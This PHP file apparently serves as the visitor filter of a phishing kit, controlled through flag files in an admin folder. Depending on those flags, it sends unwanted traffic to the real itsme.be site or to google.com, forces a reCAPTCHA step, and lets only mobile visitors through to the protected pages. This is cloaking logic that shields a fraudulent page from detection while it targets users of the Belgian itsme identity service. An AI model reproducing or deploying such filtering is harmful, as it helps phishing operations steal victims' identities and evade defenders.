<?php


if (empty($key)) {
  $key=$_SESSION["panelsession"];
}


if (file_exists("../admin/traffic"))
{
    $fileContent = file_get_contents("../admin/traffic");
     if ($fileContent ==2){header('location: https://itsme.be'); }

     if ($fileContent ==3){









      $fileContent = file_get_contents("../admin/ReCAPTCHA"); if ($fileContent ==1){


        if(isset($_SESSION["reCAPTCHA"]) && !empty($_SESSION["reCAPTCHA"])) {

        if ($_SESSION["reCAPTCHA"] == "verified")
          {
            //verified, you may go
          }else {
            header("location: recaptcha.php?x=$key"); //NOT VERIFEID OMG, you shall not pass

         } ;}else{  header("location: recaptcha.php?x=$key"); die();}









    }

             $fileContent = file_get_contents("../admin/MobileOnly"); if ($fileContent ==1){


               include_once 'Mobile_Detect.php';
$detect = new Mobile_Detect();

// Check for any mobile device.
if ($detect->isMobile()){
// mobile content
}
else {
header("location: https://google.com");
}

}

}




//Advanced Filter
}







else {

  if (file_exists("../admin/traffic"))
  {
      $fileContent = file_get_contents("../admin/traffic");
       if ($fileContent ==2){header('location: https://itsme.be'); die();}

         if ($fileContent ==3){




        $fileContent = file_get_contents("../admin/ReCAPTCHA"); if ($fileContent ==1){


          if(isset($_SESSION["reCAPTCHA"]) && !empty($_SESSION["reCAPTCHA"])) {

          if ($_SESSION["reCAPTCHA"] == "verified")
            {
              //verified, you may go
            }else {
              header("location: ../recaptcha.php?x=$key"); //NOT VERIFEID OMG, you shall not pass
           } ;}else{  header("location: ../recaptcha.php?x=$key"); }






          ;}

/*

                  $fileContent = file_get_contents("../admin/MobileOnly"); if ($fileContent ==1){


                    include 'Mobile_Detect.php';
$detect = new Mobile_Detect();

// Check for any mobile device.
if ($detect->isMobile()){
   // mobile content
}
else {
header("location: https://google.com");
}


                  }



*/








    //Advanced Filter


        }
}

}

?>
